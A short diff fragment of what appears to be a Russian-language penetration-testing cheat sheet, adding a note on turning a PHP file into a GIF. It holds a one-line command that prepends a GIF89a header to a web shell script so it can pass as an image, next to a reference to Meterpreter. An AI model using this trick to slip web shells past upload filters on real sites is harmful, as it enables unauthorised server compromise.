@@ -156,5 +156,7 @@ run
 https://www.offsec.com/metasploit-unleashed/meterpreter-service/
 
 
+# Переделка файла php в gif
 
+echo -e "GIF89a1\n\n$(cat shell.php)" > shell.gif
 
